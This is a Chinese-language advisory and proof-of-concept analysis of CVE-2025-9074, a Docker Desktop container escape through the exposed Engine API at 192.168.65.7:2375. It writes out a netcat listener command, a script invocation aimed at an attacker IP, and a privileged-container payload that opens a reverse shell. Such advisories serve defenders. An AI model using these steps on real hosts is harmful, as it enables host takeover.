## CVE-2025-9074 - Docker Desktop 容器逃逸 (Container Escape), 越权访问 (Privilege Escalation), 远程代码执行 (Remote Code Execution)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 (Container Escape), 越权访问 (Privilege Escalation), 远程代码执行 (Remote Code Execution)

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** 影响Windows和macOS版本，所有版本早于4.44.3

**利用条件:** 本地运行的恶意Linux容器，能够通过默认子网(192.168.65.7:2375)访问Docker Engine API，不依赖挂载Docker socket，也不受“Expose daemon on tcp://localhost:2375 without TLS”设置的影响。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074是一个在Docker Desktop中发现的严重漏洞，其CVSS评分为9.3（满分10分）。该漏洞允许在Windows和macOS系统上本地运行的恶意Linux容器绕过隔离机制，通过默认的Docker子网（通常为192.168.65.7:2375）直接访问Docker Engine API。这种未经授权的API访问最终可导致攻击者完全控制运行Docker Desktop的主机系统，实现容器逃逸和远程代码执行。此漏洞不依赖于挂载Docker socket，并且不受“Expose daemon on tcp://localhost:2375 without TLS”设置的限制，使其更具隐蔽性和威胁性。Docker官方已于2025年8月20日在Docker Desktop 4.44.3版本中修复了此漏洞，因此所有早于此版本的Docker Desktop都存在风险。

**POC有效性分析:**
提供的POC代码（`cve-2025-9074.sh`）是一个功能完整的bash脚本，专门用于利用CVE-2025-9074漏洞。该脚本利用`curl`工具与Docker Engine API进行交互，首先验证API的可访问性，然后构造一个恶意的容器创建请求。该请求的JSON payload精心设计，用于创建一个新的`alpine:latest`容器，并赋予其高度特权：`"Privileged": true`（特权模式），`"NetworkMode": "host"`（主机网络模式），以及`"Binds": ["/:/hostfs:rw"]`（将主机根文件系统挂载到容器内）。最为关键的是，`"Cmd"`字段包含了一个利用`netcat`建立反向shell的命令，该shell会连接到攻击者指定的IP和端口。一旦这个恶意容器被创建并启动，反向shell便会执行，从而使攻击者获得对Docker Desktop主机系统的root权限。这个POC直接且有效地展示了漏洞从容器内部到主机系统的完整逃逸路径和RCE能力，证明了其高度的有效性和威胁性。

**利用步骤:**
1.  **前提条件**: 攻击者需要已经控制一个在受影响的Docker Desktop版本上运行的Linux容器。
2.  **设置监听器**: 攻击者在其控制的远程机器上启动一个`netcat`监听器，等待反向shell连接。例如：`nc -lvnp <listener_port>`。
3.  **获取POC脚本**: 将`cve-2025-9074.sh`脚本传输到被控的Linux容器内部。
4.  **执行POC脚本**: 在容器内部执行POC脚本，并提供正确的参数。
    *   `./cve-2025-9074.sh <docker_api_ip> <docker_api_port> <attacker_ip> <listener_port>`
    *   例如：`./cve-2025-9074.sh 192.168.65.7 2375 10.10.14.x 4444` (其中`10.10.14.x`是攻击者的IP地址，`4444`是监听端口)。
5.  **API访问验证**: 脚本首先会尝试访问`http://192.168.65.7:2375/version`来确认Docker API的可达性。
6.  **创建并启动恶意容器**: 脚本会发送一个`POST`请求到`http://192.168.65.7:2375/containers/create`，其payload包含创建特权容器、挂载主机根目录以及执行反向shell的指令。
7.  **获得反向Shell**: 恶意容器启动后，其内置的反向shell命令将自动执行，连接到攻击者机器上预设的`netcat`监听器。攻击者将获得一个在Docker Desktop主机上以root权限运行的shell，从而完全控制主机系统。

**投毒风险分析:**
对CVE-2025-9074的POC代码(`cve-2025-9074.sh`)进行分析后，可以评估其投毒风险为低，具体百分比约为5%。以下是详细分析：

1.  **代码透明度**: 该POC是一个用Bash编写的脚本，其代码内容完全公开且易于理解。脚本中没有使用任何混淆技术，所有操作和命令都以明文形式展示。这种高透明度允许任何具备基本Bash知识的用户轻松审查代码，从而快速识别潜在的恶意行为或非预期功能。它直接使用了标准的`curl`命令与Docker API进行交互，以及`netcat`进行反向shell连接，这些都是业界常见的工具和技术。

2.  **依赖性**: 脚本的依赖仅限于常见的Linux系统工具，如`curl`（用于HTTP请求）、`cat`、`grep`、`cut`（用于文本处理）、`rm`、`mkfifo`（用于文件操作），以及`netcat`（用于建立反向shell）。这些工具通常在大多数Linux发行版和Docker容器中默认安装或易于获取，且其行为是众所周知的。脚本不涉及下载或执行任何外部二进制文件、第三方库或不安全的外部脚本，从而显著降低了供应链攻击的风险。

3.  **恶意负载的显式性**: POC的核心“恶意负载”是用于建立反向shell的`netcat`命令，它被明确地嵌入在Docker容器创建请求的`Cmd`字段中。这并非隐藏在代码深处的意外功能，而是该漏洞利用方式的直接演示。脚本的目的是展示通过API访问创建特权容器并执行任意命令的能力，反向shell正是这一能力的最直观体现。因此，此“恶意负载”是POC预期功能的一部分，而非旨在秘密损害使用者系统的不良代码。

4.  **网络行为**: 脚本的网络行为是可预测且可控的。它会向Docker Desktop的本地API（默认`192.168.65.7:2375`）发送HTTP请求，并尝试将反向shell连接回用户指定的攻击者IP和端口。这些目标IP和端口必须作为命令行参数显式提供，没有硬编码的外部命令与控制（C2）服务器地址，也没有未经授权的数据外传行为。所有的网络连接都是为了漏洞验证而明确设计的。

5.  **总结**: 鉴于POC代码的清晰度、对标准工具的依赖、恶意负载的透明性以及可控的网络行为，此POC的投毒风险极低。使用者在执行前可以轻易地进行代码审计，确保其符合预期目的。README文件中也明确指出了其仅用于教育和授权安全测试目的的法律免责声明，进一步支持了其防御性安全研究的合法意图。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
